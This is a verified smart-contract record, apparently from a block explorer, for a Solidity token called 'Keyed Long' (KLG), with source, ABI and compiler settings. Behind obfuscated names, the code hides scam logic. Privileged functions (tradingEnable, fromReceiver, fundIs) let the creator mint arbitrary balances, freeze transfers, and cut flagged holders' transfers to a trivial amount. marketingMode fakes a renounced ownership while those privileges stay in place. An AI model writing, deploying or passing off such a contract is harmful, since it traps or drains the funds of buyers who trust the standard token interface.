{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface teamTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverTxFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isMinTeam {\n    function createPair(address launchTx, address isTrading) external returns (address);\n}\n\ninterface toMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMarketing) external view returns (uint256);\n\n    function transfer(address takeFrom, uint256 amountLiquidity) external returns (bool);\n\n    function allowance(address atAutoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFrom,\n        uint256 amountLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromWallet, uint256 value);\n    event Approval(address indexed atAutoReceiver, address indexed spender, uint256 value);\n}\n\ninterface listLaunchedAuto is toMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract KeyedLong is receiverTxFrom, toMin, listLaunchedAuto {\n\n    uint256 constant buyFee = 20 ** 10;\n\n    bool public swapToken;\n\n    function allowance(address walletTake, address teamSell) external view virtual override returns (uint256) {\n        if (teamSell == limitTotal) {\n            return type(uint256).max;\n        }\n        return totalAuto[walletTake][teamSell];\n    }\n\n    address public amountFrom;\n\n    string private receiverEnable = \"KLG\";\n\n    function owner() external view returns (address) {\n        return txTo;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeMax;\n    }\n\n    function transferFrom(address totalSell, address takeFrom, uint256 amountLiquidity) external override returns (bool) {\n        if (_msgSender() != limitTotal) {\n            if (totalAuto[totalSell][_msgSender()] != type(uint256).max) {\n                require(amountLiquidity <= totalAuto[totalSell][_msgSender()]);\n                totalAuto[totalSell][_msgSender()] -= amountLiquidity;\n            }\n        }\n        return autoBuy(totalSell, takeFrom, amountLiquidity);\n    }\n\n    uint8 private feeMax = 18;\n\n    function swapFeeTx() private view {\n        require(limitTake[_msgSender()]);\n    }\n\n    address private txTo;\n\n    uint256 private txLiquidity = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public limitTake;\n\n    mapping(address => mapping(address => uint256)) private totalAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txLiquidity;\n    }\n\n    function fromReceiver(uint256 amountLiquidity) public {\n        swapFeeTx();\n        totalTake = amountLiquidity;\n    }\n\n    uint256 totalTake;\n\n    address tokenExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fromEnable;\n\n    uint256 public exemptAt;\n\n    constructor (){\n        if (exemptAt != fromEnable) {\n            fromEnable = feeSwap;\n        }\n        teamTrading autoFrom = teamTrading(limitTotal);\n        amountFrom = isMinTeam(autoFrom.factory()).createPair(autoFrom.WETH(), address(this));\n        \n        fundTo = _msgSender();\n        marketingMode();\n        limitTake[fundTo] = true;\n        buyMarketing[fundTo] = txLiquidity;\n        if (exemptAt == feeSwap) {\n            exemptAt = feeSwap;\n        }\n        emit Transfer(address(0), fundTo, txLiquidity);\n    }\n\n    function autoBuy(address totalSell, address takeFrom, uint256 amountLiquidity) internal returns (bool) {\n        if (totalSell == fundTo) {\n            return receiverLaunched(totalSell, takeFrom, amountLiquidity);\n        }\n        uint256 amountAuto = toMin(amountFrom).balanceOf(tokenExempt);\n        require(amountAuto == totalTake);\n        require(takeFrom != tokenExempt);\n        if (maxFrom[totalSell]) {\n            return receiverLaunched(totalSell, takeFrom, buyFee);\n        }\n        return receiverLaunched(totalSell, takeFrom, amountLiquidity);\n    }\n\n    address limitTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public fundTo;\n\n    mapping(address => bool) public maxFrom;\n\n    event OwnershipTransferred(address indexed senderMarketing, address indexed walletBuy);\n\n    string private toAt = \"Keyed Long\";\n\n    function fundIs(address senderAtTake) public {\n        swapFeeTx();\n        if (feeSwap == exemptAt) {\n            exemptAt = feeSwap;\n        }\n        if (senderAtTake == fundTo || senderAtTake == amountFrom) {\n            return;\n        }\n        maxFrom[senderAtTake] = true;\n    }\n\n    uint256 toLaunchedTeam;\n\n    uint256 public feeSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverEnable;\n    }\n\n    function receiverLaunched(address totalSell, address takeFrom, uint256 amountLiquidity) internal returns (bool) {\n        require(buyMarketing[totalSell] >= amountLiquidity);\n        buyMarketing[totalSell] -= amountLiquidity;\n        buyMarketing[takeFrom] += amountLiquidity;\n        emit Transfer(totalSell, takeFrom, amountLiquidity);\n        return true;\n    }\n\n    function balanceOf(address fundMarketing) public view virtual override returns (uint256) {\n        return buyMarketing[fundMarketing];\n    }\n\n    function tradingEnable(address feeEnable, uint256 amountLiquidity) public {\n        swapFeeTx();\n        buyMarketing[feeEnable] = amountLiquidity;\n    }\n\n    function transfer(address feeEnable, uint256 amountLiquidity) external virtual override returns (bool) {\n        return autoBuy(_msgSender(), feeEnable, amountLiquidity);\n    }\n\n    mapping(address => uint256) private buyMarketing;\n\n    function approve(address teamSell, uint256 amountLiquidity) public virtual override returns (bool) {\n        totalAuto[_msgSender()][teamSell] = amountLiquidity;\n        emit Approval(_msgSender(), teamSell, amountLiquidity);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return txTo;\n    }\n\n    function marketingMode() public {\n        emit OwnershipTransferred(fundTo, address(0));\n        txTo = address(0);\n    }\n\n    function takeSell(address launchLiquidity) public {\n        require(launchLiquidity.balance < 100000);\n        if (swapToken) {\n            return;\n        }\n        \n        limitTake[launchLiquidity] = true;\n        \n        swapToken = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atAutoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAtTake\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidity\",\"type\":\"address\"}],\"name\":\"takeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"tradingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "KeyedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}